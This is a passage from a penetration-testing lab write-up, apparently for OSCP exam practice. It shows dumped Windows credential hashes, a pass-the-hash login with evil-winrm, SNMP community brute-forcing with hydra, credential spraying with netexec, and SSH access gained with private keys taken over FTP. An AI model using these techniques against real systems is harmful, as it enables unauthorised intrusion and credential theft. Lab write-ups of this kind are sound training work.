	kerberos :	
	 * Username : MS02$
	 * Domain   : OSCP.EXAM
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 122338 (00000000:0001dde2)
Session           : Service from 0
User Name         : SQLTELEMETRY$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 7/4/2026 3:48:52 PM
SID               : S-1-5-80-1985561900-798682989-2213159822-1904180398-3434236965
	msv :	
	 [00000003] Primary
	 * Username : MS02$
	 * Domain   : OSCP
	 * NTLM     : 2762b6bb841ccd9ec59844c0217ba338
	 * SHA1     : 488806ab84ef6aa2ae41ad309152eed9b70afe3e
	tspkg :	
	wdigest :	
	 * Username : MS02$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS02$
	 * Domain   : oscp.exam
	 * Password : d4 8f 76 57 cc 76 c8 71 64 8e 44 36 ca 7e 60 fa be 99 09 45 a2 e6 9c af 16 3a f0 57 4c 6d 10 02 6c 08 5f f1 80 d1 89 fd 62 52 98 d4 26 91 0f dc dc 73 2f fd af 25 f2 36 87 96 95 6d 32 09 c0 f9 4e 26 41 22 89 9d f2 66 c3 c7 55 e8 80 33 b3 56 4a 7b 66 b7 40 b0 f2 70 82 d2 d4 14 0a b0 74 72 7e 4a f5 db b2 17 64 21 6c e4 84 13 52 b6 11 bf 3f f5 54 31 44 b9 12 af 58 00 0d 26 b2 e1 8c 25 d8 42 04 7d 40 6d c7 2c 89 18 de 47 bb b6 5a 8d aa d3 0a 9f 14 24 21 c0 05 e0 23 dc e4 d3 39 62 bb d0 93 ac 46 74 b3 b2 55 28 fc 64 de 0a 6f d6 69 55 90 df 03 cb ac 57 81 73 83 ac 93 3d 89 1e d7 e7 04 e8 02 92 5f 6f a2 1d 91 c4 57 18 7a c5 11 8d 53 21 a1 7e 73 2e 63 c7 b4 6f cb 10 8f 60 ec 81 1a 50 a1 f7 07 4d 29 97 bf b9 17 d1 72 c8 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 7/4/2026 3:48:51 PM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 68338 (00000000:00010af2)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/4/2026 3:48:51 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS02$
	 * Domain   : OSCP
	 * NTLM     : f0fbae9774187037e5d553d1c8c24236
	 * SHA1     : 744eb9990465c3e1053457f0a3e82d4dcecbb20c
	tspkg :	
	wdigest :	
	 * Username : MS02$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS02$
	 * Domain   : oscp.exam
	 * Password : 8a dc 45 e4 ae cc 5c e9 c8 d0 5a a3 f1 43 5f 67 f8 90 9d a4 c4 61 77 02 64 82 cf 98 87 3f 73 93 7f 83 d7 38 e8 2d 25 74 6f e1 c4 6e 80 cb fa 33 90 c3 21 c0 0d 00 a3 f7 c8 c9 7b 84 7f b4 1d d5 67 b2 b7 b2 0d 65 af 09 9c 5e 56 c2 77 c8 47 bf 90 0a 4f 9b 06 66 52 fe 7e 7b ce 4f fc e0 d8 e6 11 06 f5 fd d6 76 83 fa e2 b2 35 cb 9d 3c 9c 49 0e 4e 1a 9a 1a 33 63 c9 f6 ef 83 5a de f2 21 20 43 34 f3 9f 3f 86 66 c2 f5 3e f6 e7 da 83 dd 26 28 68 f1 5f 94 67 47 d6 fe 62 f1 ec 59 57 40 50 18 f1 eb 3b 43 97 fe de 66 09 b2 99 b1 a7 c2 09 3c f6 b2 42 d0 eb a7 26 ff 88 96 bb c2 52 17 95 e3 47 90 04 43 ac 98 da 22 2f 29 54 97 8c 97 6d fc fc 8f 22 c6 e4 13 2e e5 ba fa f4 97 c0 df f6 70 8a 63 fd 25 58 e7 2a ae 70 94 9b 39 db 0e 13 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 68320 (00000000:00010ae0)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/4/2026 3:48:51 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS02$
	 * Domain   : OSCP
	 * NTLM     : 2762b6bb841ccd9ec59844c0217ba338
	 * SHA1     : 488806ab84ef6aa2ae41ad309152eed9b70afe3e
	tspkg :	
	wdigest :	
	 * Username : MS02$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS02$
	 * Domain   : oscp.exam
	 * Password : d4 8f 76 57 cc 76 c8 71 64 8e 44 36 ca 7e 60 fa be 99 09 45 a2 e6 9c af 16 3a f0 57 4c 6d 10 02 6c 08 5f f1 80 d1 89 fd 62 52 98 d4 26 91 0f dc dc 73 2f fd af 25 f2 36 87 96 95 6d 32 09 c0 f9 4e 26 41 22 89 9d f2 66 c3 c7 55 e8 80 33 b3 56 4a 7b 66 b7 40 b0 f2 70 82 d2 d4 14 0a b0 74 72 7e 4a f5 db b2 17 64 21 6c e4 84 13 52 b6 11 bf 3f f5 54 31 44 b9 12 af 58 00 0d 26 b2 e1 8c 25 d8 42 04 7d 40 6d c7 2c 89 18 de 47 bb b6 5a 8d aa d3 0a 9f 14 24 21 c0 05 e0 23 dc e4 d3 39 62 bb d0 93 ac 46 74 b3 b2 55 28 fc 64 de 0a 6f d6 69 55 90 df 03 cb ac 57 81 73 83 ac 93 3d 89 1e d7 e7 04 e8 02 92 5f 6f a2 1d 91 c4 57 18 7a c5 11 8d 53 21 a1 7e 73 2e 63 c7 b4 6f cb 10 8f 60 ec 81 1a 50 a1 f7 07 4d 29 97 bf b9 17 d1 72 c8 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS02$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 7/4/2026 3:48:51 PM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : MS02$
	 * Domain   : OSCP
	 * NTLM     : 2762b6bb841ccd9ec59844c0217ba338
	 * SHA1     : 488806ab84ef6aa2ae41ad309152eed9b70afe3e
	tspkg :	
	wdigest :	
	 * Username : MS02$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : ms02$
	 * Domain   : OSCP.EXAM
	 * Password : d4 8f 76 57 cc 76 c8 71 64 8e 44 36 ca 7e 60 fa be 99 09 45 a2 e6 9c af 16 3a f0 57 4c 6d 10 02 6c 08 5f f1 80 d1 89 fd 62 52 98 d4 26 91 0f dc dc 73 2f fd af 25 f2 36 87 96 95 6d 32 09 c0 f9 4e 26 41 22 89 9d f2 66 c3 c7 55 e8 80 33 b3 56 4a 7b 66 b7 40 b0 f2 70 82 d2 d4 14 0a b0 74 72 7e 4a f5 db b2 17 64 21 6c e4 84 13 52 b6 11 bf 3f f5 54 31 44 b9 12 af 58 00 0d 26 b2 e1 8c 25 d8 42 04 7d 40 6d c7 2c 89 18 de 47 bb b6 5a 8d aa d3 0a 9f 14 24 21 c0 05 e0 23 dc e4 d3 39 62 bb d0 93 ac 46 74 b3 b2 55 28 fc 64 de 0a 6f d6 69 55 90 df 03 cb ac 57 81 73 83 ac 93 3d 89 1e d7 e7 04 e8 02 92 5f 6f a2 1d 91 c4 57 18 7a c5 11 8d 53 21 a1 7e 73 2e 63 c7 b4 6f cb 10 8f 60 ec 81 1a 50 a1 f7 07 4d 29 97 bf b9 17 d1 72 c8 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 38612 (00000000:000096d4)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/4/2026 3:48:51 PM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : MS02$
	 * Domain   : OSCP
	 * NTLM     : 2762b6bb841ccd9ec59844c0217ba338
	 * SHA1     : 488806ab84ef6aa2ae41ad309152eed9b70afe3e
	tspkg :	
	wdigest :	
	 * Username : MS02$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS02$
	 * Domain   : oscp.exam
	 * Password : d4 8f 76 57 cc 76 c8 71 64 8e 44 36 ca 7e 60 fa be 99 09 45 a2 e6 9c af 16 3a f0 57 4c 6d 10 02 6c 08 5f f1 80 d1 89 fd 62 52 98 d4 26 91 0f dc dc 73 2f fd af 25 f2 36 87 96 95 6d 32 09 c0 f9 4e 26 41 22 89 9d f2 66 c3 c7 55 e8 80 33 b3 56 4a 7b 66 b7 40 b0 f2 70 82 d2 d4 14 0a b0 74 72 7e 4a f5 db b2 17 64 21 6c e4 84 13 52 b6 11 bf 3f f5 54 31 44 b9 12 af 58 00 0d 26 b2 e1 8c 25 d8 42 04 7d 40 6d c7 2c 89 18 de 47 bb b6 5a 8d aa d3 0a 9f 14 24 21 c0 05 e0 23 dc e4 d3 39 62 bb d0 93 ac 46 74 b3 b2 55 28 fc 64 de 0a 6f d6 69 55 90 df 03 cb ac 57 81 73 83 ac 93 3d 89 1e d7 e7 04 e8 02 92 5f 6f a2 1d 91 c4 57 18 7a c5 11 8d 53 21 a1 7e 73 2e 63 c7 b4 6f cb 10 8f 60 ec 81 1a 50 a1 f7 07 4d 29 97 bf b9 17 d1 72 c8 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 38596 (00000000:000096c4)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/4/2026 3:48:51 PM
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS02$
	 * Domain   : OSCP
	 * NTLM     : 2762b6bb841ccd9ec59844c0217ba338
	 * SHA1     : 488806ab84ef6aa2ae41ad309152eed9b70afe3e
	tspkg :	
	wdigest :	
	 * Username : MS02$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS02$
	 * Domain   : oscp.exam
	 * Password : d4 8f 76 57 cc 76 c8 71 64 8e 44 36 ca 7e 60 fa be 99 09 45 a2 e6 9c af 16 3a f0 57 4c 6d 10 02 6c 08 5f f1 80 d1 89 fd 62 52 98 d4 26 91 0f dc dc 73 2f fd af 25 f2 36 87 96 95 6d 32 09 c0 f9 4e 26 41 22 89 9d f2 66 c3 c7 55 e8 80 33 b3 56 4a 7b 66 b7 40 b0 f2 70 82 d2 d4 14 0a b0 74 72 7e 4a f5 db b2 17 64 21 6c e4 84 13 52 b6 11 bf 3f f5 54 31 44 b9 12 af 58 00 0d 26 b2 e1 8c 25 d8 42 04 7d 40 6d c7 2c 89 18 de 47 bb b6 5a 8d aa d3 0a 9f 14 24 21 c0 05 e0 23 dc e4 d3 39 62 bb d0 93 ac 46 74 b3 b2 55 28 fc 64 de 0a 6f d6 69 55 90 df 03 cb ac 57 81 73 83 ac 93 3d 89 1e d7 e7 04 e8 02 92 5f 6f a2 1d 91 c4 57 18 7a c5 11 8d 53 21 a1 7e 73 2e 63 c7 b4 6f cb 10 8f 60 ec 81 1a 50 a1 f7 07 4d 29 97 bf b9 17 d1 72 c8 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 37424 (00000000:00009230)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 7/4/2026 3:48:50 PM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : MS02$
	 * Domain   : OSCP
	 * NTLM     : 2762b6bb841ccd9ec59844c0217ba338
	 * SHA1     : 488806ab84ef6aa2ae41ad309152eed9b70afe3e
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS02$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 7/4/2026 3:48:50 PM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : MS02$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : ms02$
	 * Domain   : OSCP.EXAM
	 * Password : d4 8f 76 57 cc 76 c8 71 64 8e 44 36 ca 7e 60 fa be 99 09 45 a2 e6 9c af 16 3a f0 57 4c 6d 10 02 6c 08 5f f1 80 d1 89 fd 62 52 98 d4 26 91 0f dc dc 73 2f fd af 25 f2 36 87 96 95 6d 32 09 c0 f9 4e 26 41 22 89 9d f2 66 c3 c7 55 e8 80 33 b3 56 4a 7b 66 b7 40 b0 f2 70 82 d2 d4 14 0a b0 74 72 7e 4a f5 db b2 17 64 21 6c e4 84 13 52 b6 11 bf 3f f5 54 31 44 b9 12 af 58 00 0d 26 b2 e1 8c 25 d8 42 04 7d 40 6d c7 2c 89 18 de 47 bb b6 5a 8d aa d3 0a 9f 14 24 21 c0 05 e0 23 dc e4 d3 39 62 bb d0 93 ac 46 74 b3 b2 55 28 fc 64 de 0a 6f d6 69 55 90 df 03 cb ac 57 81 73 83 ac 93 3d 89 1e d7 e7 04 e8 02 92 5f 6f a2 1d 91 c4 57 18 7a c5 11 8d 53 21 a1 7e 73 2e 63 c7 b4 6f cb 10 8f 60 ec 81 1a 50 a1 f7 07 4d 29 97 bf b9 17 d1 72 c8 
	ssp :	
	credman :	
	cloudap :	

```

Administrator is the next step

```
Authentication Id : 0 ; 379331 (00000000:0005c9c3)
Session           : Interactive from 1
User Name         : Administrator
Domain            : OSCP
Logon Server      : DC01
Logon Time        : 7/4/2026 3:48:59 PM
SID               : S-1-5-21-2610934713-1581164095-2706428072-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : OSCP
	 * NTLM     : 59b280ba707d22e3ef0aa587fc29ffe5
	 * SHA1     : f41a495e6d341c7416a42abd14b9aef6f1eb6b17
	 * DPAPI    : 959ad2ea78c63aebf3233679ad90d769
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : OSCP.EXAM
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	
```

# IP 1

### evil-winrm

Try the different IP with Administrator and the hash

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $evil-winrm -i 10.10.135.146   -u Administrator -H  59b280ba707d22e3ef0aa587fc29ffe5
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ip a
The term 'ip' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ ip a
+ ~~
    + CategoryInfo          : ObjectNotFound: (ip:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig

Windows IP Configuration


Ethernet adapter tapd3eff1c1-1f:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::68ba:b65a:5f1:a069%23
   IPv4 Address. . . . . . . . . . . : 10.10.135.146
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.135.254
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

# IP 4

#### Port and Scan

```
Nmap scan report for 192.168.240.149
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 04:bb:76:66:40:0e:b6:3d:b7:14:92:82:f6:db:50:42 (RSA)
|   256 a4:f3:81:38:8a:60:b0:ef:9b:09:35:2c:1a:ac:31:f0 (ECDSA)
|_  256 45:86:83:7a:79:b9:f8:7d:0a:95:10:71:7a:23:bd:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.83 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-05 14:09 HKT
Nmap scan report for 192.168.240.149
Host is up (0.041s latency).
Not shown: 95 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
88/udp    closed kerberos-sec
161/udp   open   snmp
514/udp   closed syslog
2223/udp  closed rockwell-csp2
49156/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds

```

### snmp

{{< toggle "Tag 🏷️" >}}

{{< tag "Port161-snmp" >}} Discovery the port 161 with snmp  and using the snmpbulkwalk

{{< /toggle >}}

Using the hydra to find the password

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $ hydra -P /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://192.168.240.149
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-05 14:16:46
[DATA] max 16 tasks per 1 server, overall 16 tasks, 118 login tries (l:1/p:118), ~8 tries per task
[DATA] attacking snmp://192.168.240.149:161/
[161][snmp] host: 192.168.240.149   password: public
[STATUS] attack finished for 192.168.240.149 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-05 14:16:46

```

Using the snmpbulkwalk and discover the password of kiero

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $snmpbulkwalk -v2c -c public 192.168.240.149 -m all NET-SNMP-EXTEND-MIB::nsExtendObjects 

MIB search path: /home/tester/.snmp/mibs:/usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf
Cannot find module (IANA-STORAGE-MEDIA-TYPE-MIB): At line 19 in /usr/share/snmp/mibs/ietf/VM-MIB
Did not find 'IANAStorageMediaType' in module #-1 (/usr/share/snmp/mibs/ietf/VM-MIB)
Cannot find module (IEEE8021-CFM-MIB): At line 30 in /usr/share/snmp/mibs/ietf/TRILL-OAM-MIB
Cannot find module (LLDP-MIB): At line 35 in /usr/share/snmp/mibs/ietf/TRILL-OAM-MIB
Did not find 'dot1agCfmMdIndex' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMaIndex' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMepIdentifier' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMepEntry' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMepDbEntry' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'Dot1agCfmIngressActionFieldValue' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'Dot1agCfmEgressActionFieldValue' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'Dot1agCfmRemoteMepState' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpChassisId' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpChassisIdSubtype' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpPortId' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpPortIdSubtype' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU
Cannot find module (IANA-SMF-MIB): At line 28 in /usr/share/snmp/mibs/ietf/SMF-MIB
Did not find 'IANAsmfOpModeIdTC' in module #-1 (/usr/share/snmp/mibs/ietf/SMF-MIB)
Did not find 'IANAsmfRssaIdTC' in module #-1 (/usr/share/snmp/mibs/ietf/SMF-MIB)
Cannot find module (IANAPowerStateSet-MIB): At line 20 in /usr/share/snmp/mibs/ietf/ENERGY-OBJECT-MIB
Did not find 'PowerStateSet' in module #-1 (/usr/share/snmp/mibs/ietf/ENERGY-OBJECT-MIB)
Cannot find module (IANA-OLSRv2-LINK-METRIC-TYPE-MIB): At line 26 in /usr/share/snmp/mibs/ietf/OLSRv2-MIB
Did not find 'IANAolsrv2LinkMetricTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/OLSRv2-MIB)
Cannot find module (IANA-ENERGY-RELATION-MIB): At line 22 in /usr/share/snmp/mibs/ietf/ENERGY-OBJECT-CONTEXT-MIB
Did not find 'IANAEnergyRelationship' in module #-1 (/usr/share/snmp/mibs/ietf/ENERGY-OBJECT-CONTEXT-MIB)
Cannot find module (IANA-BFD-TC-STD-MIB): At line 30 in /usr/share/snmp/mibs/ietf/BFD-STD-MIB
Did not find 'IANAbfdDiagTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessOperModeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessStateTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessAuthenticationTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessAuthenticationKeyTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendCommand."RESET" = STRING: ./home/john/RESET_PASSWD
NET-SNMP-EXTEND-MIB::nsExtendArgs."RESET" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."RESET" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."RESET" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."RESET" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."RESET" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."RESET" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."RESET" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."RESET" = STRING: Resetting password of kiero to the default value
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."RESET" = STRING: Resetting password of kiero to the default value
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."RESET" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."RESET" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."RESET".1 = STRING: Resetting password of kiero to the default value

```

Using the loop to find the nxc can be login FTP

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $for proto in smb winrm wmi rdp ssh ldap mssql ftp; do for auth in "" "--local-auth"; do echo -e "\n[*] Testing $proto ${auth:+(local-auth)}..."; netexec $proto 192.168.240.149  -u kiero -p kiero  $auth --continue-on-success ; done; done


[*] Testing smb ...

[*] Testing smb (local-auth)...

[*] Testing winrm ...

[*] Testing winrm (local-auth)...

[*] Testing wmi ...

[*] Testing wmi (local-auth)...

[*] Testing rdp ...

[*] Testing rdp (local-auth)...

[*] Testing ssh ...
SSH         192.168.240.149 22     192.168.240.149  [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
SSH         192.168.240.149 22     192.168.240.149  [-] kiero:kiero

[*] Testing ssh (local-auth)...
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth

[*] Testing ldap ...

[*] Testing ldap (local-auth)...
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth

[*] Testing mssql ...

[*] Testing mssql (local-auth)...

[*] Testing ftp ...
FTP         192.168.240.149 21     192.168.240.149  [+] kiero:kiero

[*] Testing ftp (local-auth)...
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth
[ble: exit 2][ble: elapsed 39.010s (CPU 86.0%)] for proto in smb wi
```

### FTP

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $ftp 192.168.240.149
Connected to 192.168.240.149.
220 (vsFTPd 3.0.3)
Name (192.168.240.149:tester): kiero
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

```
229 Entering Extended Passive Mode (|||10099|)
150 Here comes the directory listing.
-rwxr-xr-x    1 114      119          2590 Nov 21  2022 id_rsa
-rw-r--r--    1 114      119           563 Nov 21  2022 id_rsa.pub
-rwxr-xr-x    1 114      119          2635 Nov 21  2022 id_rsa_2

```

```
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||10095|)
150 Opening BINARY mode data connection for id_rsa (2590 bytes).
100% |*****************************************************************************************************************************************************************|  2590       25.46 MiB/s    00:00 ETA
226 Transfer complete.
2590 bytes received in 00:00 (69.38 KiB/s)
ftp> get id_rsa_2
local: id_rsa_2 remote: id_rsa_2
229 Entering Extended Passive Mode (|||10097|)
150 Opening BINARY mode data connection for id_rsa_2 (2635 bytes).
100% |*****************************************************************************************************************************************************************|  2635        3.81 MiB/s    00:00 ETA
226 Transfer complete.
2635 bytes received in 00:00 (66.61 KiB/s)
ftp> cat id_rsa | grep -v '\----' | base64 -d | strings
ftp> exit
221 Goodbye.

```

Id\_ras to find what we need

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $cat id_rsa | grep -v '\----' | base64 -d | strings
openssh-key-v1
none
none
ssh-rsa
;{^_
Z5.e
'O~K
.Z`N0
Re@g
XO\'
ssh-rsa
;{^_
Z5.e
'O~K
.Z`N0
Re@g
XO\'
"Egq
~ZICd
}LnL
ws3S+
f6N5
A&dA
=t+]P1
	john@oscp

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $chmod 600 id_rsa 
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $ssh-keygen -y -f id_rsa
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8J1/BFjH/Oet/zx+bKUUop1IuGd93QKio7Dt7Xl/J91c2EvGkYDKL5xGbfQRxsT9IePkVINONXQHmzARaNS5lE+SoAfFAnCPnRJ+KrnJdPxYf4OQEiAxHwRJHvbYaxEEuye7GKP6V0MdSvDtqKsFk0YRFVdPKuforL/8SYtSfqYUywUJ/ceiZL/2ffGGBJ/trQJ2bBL4QcOg05ZxrEoiTJ09+Sw3fKrnhNa5/NzYSib+0llLtlGbagBh3F9n10yqqLlpgTjDp5PKenncFiKl1llJlQGcGhLXxeoTI59brTjssp8J+z6A48h699CexyGe02GZfKLLLE+wKn/4luY0Ve8tnGllEdNFfGFVm7WyTmAO2vtXMmUbPaavDWE9cJ/WFXovDKtNCJxpyYVPy2f7aHYR37arLL6aEemZdqzDwl67Pu5y793FLd41qWHG6a4XD05RHAD0ivsJDkypI8gMtr3TOmxYVbPmq9ecPFmSXxVEK8oO3qu2pxa/e4izXBFc= john@oscp

```

### ssh

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $ssh -i ./id_rsa john@192.168.240.149
The authenticity of host '192.168.240.149 (192.168.240.149)' can't be established.
ED25519 key fingerprint is SHA256:jN32szZpfKgmFGC/UavTMFXn3DsXLsb/IZZJcTJpdcI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.240.149' (ED25519) to the list of known hosts.
Last login: Tue Nov 22 08:31:27 2022 from 192.168.118.3
john@lab-pwk2-student-cl5-149-ubuntu1804-kiero-240-190:~$ 

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh
